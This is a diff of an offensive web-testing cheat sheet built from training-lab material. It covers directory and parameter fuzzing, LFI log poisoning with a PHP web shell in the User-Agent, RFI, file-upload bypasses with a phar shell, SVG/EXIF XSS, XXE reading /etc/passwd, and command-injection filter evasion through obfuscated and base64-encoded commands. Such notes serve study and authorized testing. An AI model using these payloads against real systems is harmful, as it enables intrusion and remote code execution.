@@ -1,7 +1,14 @@
 
-Fuzzing properly:
-`gobuster dir -u http://172.16.136.30/ -w /usr/share/dirb/wordlists/big.txt -t 200 -x .aspx,.php,.jsp,.html,.js`
+### Fuzzing
 
+* Directory fuzzing: `ffuf -w <wordlist>:FUZZ -u "http://academy.htb:30873/FUZZ" -t 200 -e .aspx,.php,.jsp,.html,.js -recursion -recursion-depth 1 -fs xxx`
+* Subdomain fuzzing: `ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/` (do not forget to add host to `/etc/hosts` file)
+* VHOST fuzzing: `ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'` (do not forget to add host to `/etc/hosts` file) 
+* Extensions fuzzing: `ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u "http://academy.htb/indexFUZZ" -fs xxx`
+* GET/POST fuzzing:
+	* GET: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://host:PORT/admin.php?FUZZ=key -fs xxx`
+	* POST: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://host:PORT/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
+	* Values: `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u 'http://academy.htb/admin.php' -X POST -d "username=FUZZ" -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
 ### Enumerating and Abusing APIs
 ```bash
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
@@ -26,6 +33,7 @@ pattern.txt
 > * If we retrieve the passwd file, try to retrieve `id_rsa` files
 > * Encode characters if needed
 > * Check for log poisoning in **Apache** servers
+> * Use **[LFITester](https://github.com/kostas-pa/LFITester)**
 
 Configuration files and dangerous settings:
 * Configuration file for Apache: `/etc/php/X.Y/apache2/php.ini`
@@ -49,7 +57,7 @@ If we retrieve Apache access log, insert php code in the User-Agent header of th
 
 > [!warning] Do no forget to try both Linux and Windows commands in log poisoning execution
 
-Through curl: `curl -s ".../meteor/index.php" -A "<?php system($_GET['cmd']); ?>"`
+Through curl: `curl -s ".../meteor/index.php" -A '<?php system($_GET["cmd"]); ?>'`
 
 ![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/a5768a72a99581707edad7a81a481e3a-cwa_lfi_modfirstreqcom.png)
 
@@ -90,6 +98,9 @@ If http RFI is blocked by a firewall or a WAF, we can achieve RFI with ftp or sm
 	* Trigger the RFI: `curl "http://mountaindesserts.com/meteor/index.php?page=\\192.168.119.3\share\simple-backdoor.php&cmd=ls"`
 
 ### File Upload
+
+**We should always check disabling Front-end validation**
+
 > **Notes:**
 > * If `.asp` or `.aspx` are allowed upload a webshell as **[p0wny shell](https://github.com/flozz/p0wny-shell)**
 > * If `.php` file is not allowed try:
@@ -113,6 +124,60 @@ If http RFI is blocked by a firewall or a WAF, we can achieve RFI with ftp or sm
 > 	```
 > 	Convert the shell to a jpg image: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
 > 	And then trigger the shell with phar wrapper: `...index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
+
+**[Wordlist: PHP extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)**
+
+We can upload a file using **double extensions** and **reverse double extension**
+
+Character injection:
+* `%20`
+- `%0a`
+- `%00`
+- `%0d0a`
+- `/`
+- `.\`
+- `.`
+- `…`
+- `:`
+
+We can build a custom wordlist with character injection:
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
+
+**MIME-Type:**
+* [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
+* [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
+
+XSS with file metadata: `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
+XSS with svg file:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+XXE:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+OR
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/contact/upload.php"> ]>
+<svg>&xxe;</svg>
+```
 
 If we can upload a file and include `../` in the file name, maybe we can overwrite the **authorized_keys**:
 
@@ -146,16 +211,90 @@ root@76b77a6eae51:~#
 ```
 
 ### Command Injection
-| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
-| ---- | ---- | ---- | ---- |
-| Semicolon | `;` | `%3b` | Both |
-| New Line | `\n` | `%0a` | Both |
-| Background | `&` | `%26` | Both (second output generally shown first) |
-| Pipe | `\|` | `%7c` | Both (only second output is shown) |
-| AND | `&&` | `%26%26` | Both (only if first succeeds) |
-| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
-| Sub-Shell | ` `` ` | `%60%60` | Both (Linux-only) |
-| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |
+
+First of all, try to find all blacklisted/whitelisted characters one by one.
+
+**[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)**
+**[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)**
+
+| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
+| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
+| Semicolon              | `;`                     | `%3b`                     | Both                                       |
+| New Line               | `\n`                    | `%0a`                     | Both                                       |
+| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
+| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
+| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
+| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
+| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
+| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
+**Bypassing Space Filters**
+* Using tabs: `127.0.0.1%0a%09`
+* Using IFS: `127.0.0.1%0a${IFS}`
+* Using brace expansion: `127.0.0.1%0a{ls,-la}`
+
+**Bypassing Other Characters:**
+* Using variables and picking one character: 
+	* Linux: 
+		 ```bash
+		peluqqi@htb[/htb]$ echo ${PATH}		
+		/usr/local/bin:/usr/bin:/bin:/usr/games
+		
+		peluqqi@htb[/htb]$ echo ${PATH:0:1}		
+		/
+		
+		peluqqi@htb[/htb]$ echo ${LS_COLORS:10:1}
+		;
+		``` 
+	* Windows cmd:
+		```cmd-session
+		C:\htb> echo %HOMEPATH:~6,-11%
+
+		\
+		```
+	* Windows Powershell:
+		```powershell-session
+		PS C:\htb> $env:HOMEPATH[0]
+		\
+
+		PS C:\htb> $env:PROGRAMFILES[10]
+		```
+
+**And more bypassing:**
+* Linux:
+	* `w'h'o'am'i`
+	* `w"h"o"am"i`
+	* `who$@ami`
+	* `w\ho\am\i`
+* Windows:
+	* `who^ami`
+* Both:
+	* Case manipulation: `WhOaMi`
+	* Reversed commands: 
+		```bash
+		peluqqi@htb[/htb]$ echo 'whoami' | rev
+		imaohw
+
+		peluqqi@htb[/htb]$ $(rev<<<'imaohw')
+		```
+		```powershell-session
+		PS C:\htb> "whoami"[-1..-20] -join ''
+		imaohw
+		
+		PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
+		```
+	* Encoded commands
+		```bash
+		peluqqi@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+		Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+
+		peluqqi@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+		```
+		```powershell-session
+		PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+		dwBoAG8AYQBtAGkA
+		
+		PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+		```
 
 Snippet to detect CMD or Powershell in Windows systems
 
